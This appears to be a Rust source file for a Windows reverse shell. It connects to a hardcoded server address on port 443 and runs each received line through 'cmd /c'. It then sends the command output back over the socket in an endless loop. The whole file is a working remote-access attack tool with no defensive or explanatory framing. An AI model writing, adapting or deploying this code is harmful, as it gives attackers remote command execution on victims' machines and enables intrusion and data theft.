use std::net::TcpStream;
use std::str;
use std::io::{BufRead,BufReader, Write};
use std::process::Command;
//use std::ffi::OsStr;

fn main() {
    let mut server_stream = TcpStream::connect("0.0.0.0:443").expect("Could not connect to the server !");
    loop {
        let mut server_cmd: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&server_stream);
        reader.read_until(b'\n', &mut server_cmd).expect("Could not read into buffer");
        //print!("{}",str::from_utf8(&server_cmd).expect("Error in writing buffer as string"));
        let cmd = str::from_utf8(&server_cmd).unwrap();
        //let win_cmd: &OsStr = OsStr::new(cmd);

        if let Ok(command) = Command::new("cmd").arg("/c").arg(cmd).output() {
            let cmdout = String::from_utf8_lossy(&command.stdout).to_string();
            println!("{}",cmdout);
            //let towrite = cmdout.trim_matches(char::from(0));
            //let finalcommand = towrite.strip_suffix("\r\n").or(towrite.strip_suffix("\n")).unwrap_or(towrite);
            server_stream.write(cmdout.as_bytes()).expect("Failed to write to server");
        }
        
    }
}